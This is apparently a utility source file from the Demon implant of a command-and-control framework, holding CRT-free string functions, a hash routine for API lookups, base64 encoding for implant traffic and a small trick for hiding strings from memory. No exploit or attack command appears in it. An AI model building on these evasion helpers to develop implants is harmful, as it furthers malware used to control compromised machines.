#include <Demon.h>

#include <core/MiniStd.h>

/*
 * Most of the functions from here are from VX-Underground https://github.com/vxunderground/VX-API
 */

INT StringCompareA( LPCSTR String1, LPCSTR String2 )
{
    for (; *String1 == *String2; String1++, String2++)
    {
        if (*String1 == '\0')
            return 0;
    }

    return ((*(LPCSTR)String1 < *(LPCSTR)String2) ? -1 : +1);

}

INT StringCompareW( LPWSTR String1, LPWSTR String2 )
{
    for (; *String1 == *String2; String1++, String2++)
    {
        if (*String1 == '\0')
            return 0;
    }

    return ((*(LPWSTR)String1 < *(LPWSTR)String2) ? -1 : +1);

}

INT StringNCompareW( LPWSTR String1, LPWSTR String2, INT Length )
{
    for (; *String1 == *String2; String1++, String2++, Length--)
    {
        if (*String1 == '\0')
            return 0;

        if ( Length == 1 )
            return 0;
    }

    return ((*(LPWSTR)String1 < *(LPWSTR)String2) ? -1 : +1);

}

WCHAR ToLowerCaseW( WCHAR C )
{
    return C > 0x40 && C < 0x5b ? C | 0x60 : C;
}

INT StringCompareIW( LPWSTR String1, LPWSTR String2 )
{
    for (; ToLowerCaseW( *String1 ) == ToLowerCaseW( *String2 ); String1++, String2++)
    {
        if (*String1 == '\0')
            return 0;
    }

    return ((*(LPWSTR)String1 < *(LPWSTR)String2) ? -1 : +1);

}

INT StringNCompareIW( LPWSTR String1, LPWSTR String2, INT Length )
{
    for (; ToLowerCaseW( *String1 ) == ToLowerCaseW( *String2 ); String1++, String2++, Length--)
    {
        if (*String1 == '\0')
            return 0;

        if ( Length == 1 )
            return 0;
    }

    return ((*(LPWSTR)String1 < *(LPWSTR)String2) ? -1 : +1);

}

BOOL EndsWithIW( LPWSTR String, LPWSTR Ending )
{
    DWORD Length1 = 0;
    DWORD Length2 = 0;

    if ( ! String || ! Ending )
        return FALSE;

    Length1 = StringLengthW( String );
    Length2 = StringLengthW( Ending );

    if ( Length1 < Length2 )
        return FALSE;

    String = &String[ Length1 - Length2 ];

    return StringCompareIW( String, Ending ) == 0;
}

/* TODO: replace every func with HashEx */
DWORD HashStringA( PCHAR String )
{
    ULONG Hash = HASH_KEY;
    INT c;

    while (c = *String++)
        Hash = ((Hash << 5) + Hash) + c;

    return Hash;
}


PCHAR StringCopyA(PCHAR String1, PCHAR String2)
{
    PCHAR p = String1;

    while ((*p++ = *String2++) != 0);

    return String1;
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
    PWCHAR p = String1;

    while ((*p++ = *String2++) != 0);

    return String1;
}

SIZE_T StringLengthA(LPCSTR String)
{
    LPCSTR String2;

    if ( String == NULL )
        return 0;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

SIZE_T StringLengthW(LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

PCHAR StringConcatA(PCHAR String, PCHAR String2)
{
    StringCopyA( &String[ StringLengthA( String ) ], String2 );

    return String;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
    StringCopyW( &String[ StringLengthW( String ) ], String2 );

    return String;
}

LPWSTR WcsStr( PWCHAR String, PWCHAR String2 )
{
    if ( ! String || ! String2 )
        return NULL;

    UINT32 Size1 = StringLengthW( String );
    UINT32 Size2 = StringLengthW( String2 );

    if ( Size2 > Size1 )
        return NULL;

    for ( UINT32 i = 0; i < Size1 - Size2 + 1; i++ )
    {
        if ( StringNCompareW( String + i, String2, Size2 ) == 0 )
            return String + i;
    }

    return NULL;
}

LPWSTR WcsIStr( PWCHAR String, PWCHAR String2 )
{
    if ( ! String || ! String2 )
        return NULL;

    UINT32 Size1 = StringLengthW( String );
    UINT32 Size2 = StringLengthW( String2 );

    if ( Size2 > Size1 )
        return NULL;

    for ( UINT32 i = 0; i < Size1 - Size2 + 1; i++ )
    {
        if ( StringNCompareIW( String + i, String2, Size2 ) == 0 )
            return String + i;
    }

    return NULL;
}

INT MemCompare( PVOID s1, PVOID s2, INT len)
{
    PUCHAR p = s1;
    PUCHAR q = s2;
    INT charCompareStatus = 0;

    if ( s1 == s2 ) {
        return charCompareStatus;
    }

    while (len > 0)
    {
        if (*p != *q)
        {
            charCompareStatus = (*p >*q)?1:-1;
            break;
        }
        len--;
        p++;
        q++;
    }
    return charCompareStatus;
}

SIZE_T WCharStringToCharString(PCHAR Destination, PWCHAR Source, SIZE_T MaximumAllowed)
{
    INT Length = MaximumAllowed;

    while (--Length >= 0)
    {
        if (!(*Destination++ = *Source++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
{
    INT Length = (INT)MaximumAllowed;

    while (--Length >= 0)
    {
        if ( ! ( *Destination++ = *Source++ ) )
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

PCHAR StringTokenA(PCHAR String, CONST PCHAR Delim)
{
    PCHAR SpanP, Token;
    INT C, SC;

    if ( String == NULL )
        return NULL;

CONTINUE:

    C = *String++;

    for (SpanP = (PCHAR)Delim; (SC = *SpanP++) != ERROR_SUCCESS;)
    {
        if (C == SC)
            goto CONTINUE;
    }

    if (C == ERROR_SUCCESS)
        return NULL;

    Token = String - 1;

    for (;;)
    {
        C = *String++;
        SpanP = (PCHAR)Delim;

        do {
            if ((SC = *SpanP++) == C)
            {
                if (C == ERROR_SUCCESS)
                    String = NULL;
                else
                    String[-1] = '\0';

                return Token;
            }
        } while (SC != ERROR_SUCCESS);
    }

    return NULL;

}

UINT64 GetSystemFileTime( )
{
    FILETIME ft;
    LARGE_INTEGER li;

    Instance->Win32.GetSystemTimeAsFileTime(&ft); //returns ticks in UTC
    li.LowPart  = ft.dwLowDateTime;
    li.HighPart = ft.dwHighDateTime;

    return li.QuadPart;
}

/* [HVC-002 2026-03-26] RFC 4648 standard base64 encode/decode. No CRT dependency.
 * All allocations use Instance->Win32.LocalAlloc. Callers are responsible for
 * freeing *OutBuf via LocalFree. See TrafficImprovements.md §2. */

static const CHAR B64Alphabet[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

VOID Base64Encode(
    _In_  PUCHAR  Input,
    _In_  SIZE_T  InputLen,
    _Out_ PVOID  *OutBuf,
    _Out_ PSIZE_T OutLen
) {
    SIZE_T EncodedLen = 4 * ( ( InputLen + 2 ) / 3 );
    PCHAR  Out        = (PCHAR) Instance->Win32.LocalAlloc( LPTR, EncodedLen + 1 );
    SIZE_T i          = 0;
    SIZE_T j          = 0;
    UCHAR  a, b, c;
    SIZE_T Rem;

    while ( i < InputLen ) {
        Rem = InputLen - i;
        a   = Input[ i++ ];
        b   = ( Rem > 1 ) ? Input[ i++ ] : 0;
        c   = ( Rem > 2 ) ? Input[ i++ ] : 0;

        Out[ j++ ] = B64Alphabet[ ( a >> 2 ) & 0x3F ];
        Out[ j++ ] = B64Alphabet[ ( ( a & 0x03 ) << 4 ) | ( ( b >> 4 ) & 0x0F ) ];
        Out[ j++ ] = ( Rem > 1 ) ? B64Alphabet[ ( ( b & 0x0F ) << 2 ) | ( ( c >> 6 ) & 0x03 ) ] : '=';
        Out[ j++ ] = ( Rem > 2 ) ? B64Alphabet[ c & 0x3F ] : '=';
    }

    Out[ j ] = '\0';
    *OutBuf  = Out;
    *OutLen  = j;
}

VOID Base64Decode(
    _In_  PUCHAR  Input,
    _In_  SIZE_T  InputLen,
    _Out_ PVOID  *OutBuf,
    _Out_ PSIZE_T OutLen
) {
    UCHAR  RevTable[ 256 ];
    SIZE_T i, j, DecodedLen;
    PUCHAR Out;
    UCHAR  a, b, c, d;

    MemSet( RevTable, 0, sizeof( RevTable ) );
    for ( i = 0; i < 64; i++ ) {
        RevTable[ (UCHAR) B64Alphabet[ i ] ] = (UCHAR) i;
    }

    /* Calculate exact output length accounting for padding characters */
    DecodedLen = ( InputLen / 4 ) * 3;
    if ( InputLen >= 2 && Input[ InputLen - 1 ] == '=' ) DecodedLen--;
    if ( InputLen >= 2 && Input[ InputLen - 2 ] == '=' ) DecodedLen--;

    Out = (PUCHAR) Instance->Win32.LocalAlloc( LPTR, DecodedLen + 1 );
    j   = 0;

    for ( i = 0; i + 3 < InputLen; i += 4 ) {
        a = RevTable[ Input[ i     ] ];
        b = RevTable[ Input[ i + 1 ] ];
        c = RevTable[ Input[ i + 2 ] ];
        d = RevTable[ Input[ i + 3 ] ];

        Out[ j++ ] = ( a << 2 ) | ( b >> 4 );
        if ( Input[ i + 2 ] != '=' ) Out[ j++ ] = ( ( b & 0x0F ) << 4 ) | ( c >> 2 );
        if ( Input[ i + 3 ] != '=' ) Out[ j++ ] = ( ( c & 0x03 ) << 6 ) | d;
    }

    *OutBuf = Out;
    *OutLen = j;
}

/* This is a simple trick to hide strings from memory :^) */
BYTE NO_INLINE HideChar( BYTE C )
{
    return C;
}
